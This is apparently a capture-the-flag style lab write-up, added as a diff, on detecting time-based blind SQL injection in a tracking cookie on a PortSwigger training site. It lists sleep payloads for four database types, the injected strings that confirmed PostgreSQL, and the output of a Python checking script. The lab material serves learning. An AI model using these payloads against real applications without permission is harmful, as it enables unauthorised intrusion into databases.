@@ -1,0 +1,54 @@
+Lab 13 - Blind SQL injection with time delays
+
+Vulnerable parameter - trackie cookie
+
+End Goal:
+- To prove that the field is vulnerable to blind SQLi (time-based)
+
+Note:
+Cannot use UNION-based SQLi: 
+- results of query are not returned and app does not respond any differently based on whether the query returns any rows or
+causes an error because the results of the SQL queries are not returned
+
+Cannot use previous blind SQLi:
+- app does not respond any differently based on whether the query returns any rows or causes an error
+
+Analysis:
+
+1. Determine the DB type and check if the DB is vulnerable to time-based SQLi payloads
+
+Inject SQL code in the trackingid cookie that causes a 10 second delay.
+If there is a 10 second delay, then there is a SQLi vulnerability.
+
+Refer to cheat sheet and look at time-based queries: https://portswigger.net/web-security/sql-injection/cheat-sheet
+
+Time delays
+You can cause a time delay in the database when the query is processed. 
+The following will cause an unconditional time delay of 10 seconds.
+
+Oracle	        dbms_pipe.receive_message(('a'),10)
+Microsoft	    WAITFOR DELAY '0:0:10'
+PostgreSQL	    SELECT pg_sleep(10)
+MySQL	        SELECT SLEEP(10)
+
+Since we don't know what type of DB this app uses, we need to fuzz (try out) the app with these 4 payloads.
+
+' || (SELECT SLEEP(10))-- -> instant response -> did not work -> not MySQL
+' || (SELECT pg_sleep(10))-- -> instant response -> 10,000ms response time -> PostgreSQL
+
+Successfully exploited the time-based SQLi vulnerability manually with Burp Suite.
+
+================================================================================================================================
+Python script usage and output:
+
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-13]
+└─$ python3 sqli-lab-13.py                                                                     
+[+] Usage: sqli-lab-13.py "<url>"
+[+] Example: sqli-lab-13.py "www.example.com"
+
+
+┌──(kali㉿kali)-[~/Downloads/SQL-Injection-Labs/lab-13]
+└─$ python3 sqli-lab-13.py "https://0a20007d04204b10800f5db80043002a.web-security-academy.net"
+[+] Checking if tracking cookie is vulnerable to time-based blind SQLi...
+[+] Vulnerable to blind-based SQL injection!
